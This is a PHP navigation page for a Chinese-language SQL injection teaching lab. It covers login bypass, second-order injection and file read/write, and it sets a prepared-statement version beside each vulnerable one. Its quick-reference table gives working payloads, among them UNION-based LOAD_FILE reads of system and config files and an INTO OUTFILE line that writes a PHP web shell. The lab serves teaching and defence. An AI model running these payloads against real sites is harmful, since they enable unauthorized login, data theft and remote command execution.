<?php
declare(strict_types=1);
require __DIR__ . '/config.php';

page_head('实验导航');
?>
<h1>SQL 注入补充实验</h1>
<p class="muted">
    三组实验：登录处的万能用户名 / 万能密码，二阶注入，以及 article.php 处的文件读与文件写。
    所有页面都会把实际执行的 SQL 打印出来。
</p>

<?php if (!is_file(__DIR__ . '/.installed')): ?>
    <div class="hint">
        第一次使用？先访问 <a href="<?= BASE_URL ?>/install.php">install.php</a> 初始化数据库和演示数据。
    </div>
<?php endif; ?>

<h2>一、万能用户名与万能密码</h2>
<div class="grid">
    <div class="card">
        <strong>Level 1 · 最朴素的拼接</strong>
        <p class="muted">单引号直接闭合，<code>admin' -- -</code> 注释掉密码判断。</p>
        <a href="<?= BASE_URL ?>/login/level1.php">进入 →</a>
    </div>
    <div class="card">
        <strong>Level 2 · 括号包裹</strong>
        <p class="muted">条件外面多了括号，payload 要先补一个 <code>)</code>。</p>
        <a href="<?= BASE_URL ?>/login/level2.php">进入 →</a>
    </div>
    <div class="card">
        <strong>Level 3 · 过滤空格和关键字</strong>
        <p class="muted">空格、or、and、-- 被删掉后，用 <code>||</code> 和 <code>#</code> 继续。</p>
        <a href="<?= BASE_URL ?>/login/level3.php">进入 →</a>
    </div>
    <div class="card">
        <strong>Level 4 · 密码先 md5</strong>
        <p class="muted">同样的 payload，放在用户名框有效，放在密码框失效。</p>
        <a href="<?= BASE_URL ?>/login/level4.php">进入 →</a>
    </div>
    <div class="card">
        <strong>对照 · 预处理语句</strong>
        <p class="muted">结构固定，payload 只能当字符串，打不穿。</p>
        <a href="<?= BASE_URL ?>/login/safe.php">进入 →</a>
    </div>
</div>

<h2>二、二阶注入</h2>
<div class="grid">
    <div class="card">
        <strong>① 注册 · 安全入库</strong>
        <p class="muted">注册 <code>hacker' OR 1=1#</code>，预处理把它原样存进库。</p>
        <a href="<?= BASE_URL ?>/second/register.php">进入 →</a>
    </div>
    <div class="card">
        <strong>② 登录 · 安全查询</strong>
        <p class="muted">登录也是预处理，带引号的用户名照样能匹配。</p>
        <a href="<?= BASE_URL ?>/second/login.php">进入 →</a>
    </div>
    <div class="card">
        <strong>③ 改密码 · 第二阶触发</strong>
        <p class="muted">库里的用户名被拼进 UPDATE，一条语句改掉所有账号密码。</p>
        <a href="<?= BASE_URL ?>/second/change.php">进入 →</a>
    </div>
    <div class="card">
        <strong>对照 · 改密码的正确写法</strong>
        <p class="muted">同样从库里取用户名，但用占位符绑定，只影响 1 行。</p>
        <a href="<?= BASE_URL ?>/second/safe.php">进入 →</a>
    </div>
</div>

<h2>三、文件读与文件写</h2>
<div class="grid">
    <div class="card">
        <strong>article.php · 数字型注入点</strong>
        <p class="muted">3 列、无引号。<code>ORDER BY</code> 猜列数，<code>UNION</code> 放 <code>LOAD_FILE()</code> 或 <code>INTO OUTFILE</code>。</p>
        <a href="<?= BASE_URL ?>/article.php?id=1">进入 →</a>
    </div>
    <div class="card">
        <strong>probe.php · 环境自检</strong>
        <p class="muted">FILE 权限、secure_file_priv、目录写权限，先确认再动手。</p>
        <a href="<?= BASE_URL ?>/probe.php">进入 →</a>
    </div>
    <div class="card">
        <strong>install.php · 安装与检查</strong>
        <p class="muted">导入数据库，顺带跑一遍读写实测。</p>
        <a href="<?= BASE_URL ?>/install.php">进入 →</a>
    </div>
</div>

<h2>30 秒速查</h2>
<table>
    <tr><th style="width:38%">目标</th><th>Payload（放在 article.php 的 id 参数里）</th></tr>
    <tr><td>猜列数</td><td><code>1 ORDER BY 4</code> 报错、<code>ORDER BY 3</code> 正常 → 3 列</td></tr>
    <tr><td>找显示位</td><td><code>-1 UNION SELECT 1,2,3</code></td></tr>
    <tr><td>读文件</td><td><code>-1 UNION SELECT 1,2,LOAD_FILE('C:/Windows/win.ini')</code></td></tr>
    <tr><td>读源码</td><td><code>-1 UNION SELECT 1,2,LOAD_FILE('C:/phpstudy_pro/WWW/sqli/config.php')</code></td></tr>
    <tr><td>写 webshell</td><td><code>-1 UNION SELECT 1,2,'&lt;?php system($_GET[0]);?&gt;' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli/upload/cmd.php'</code></td></tr>
</table>

<p class="muted">部署见 <code>README.md</code>；路径按自己的小皮面板安装位置替换。</p>
<?php page_foot(); ?>
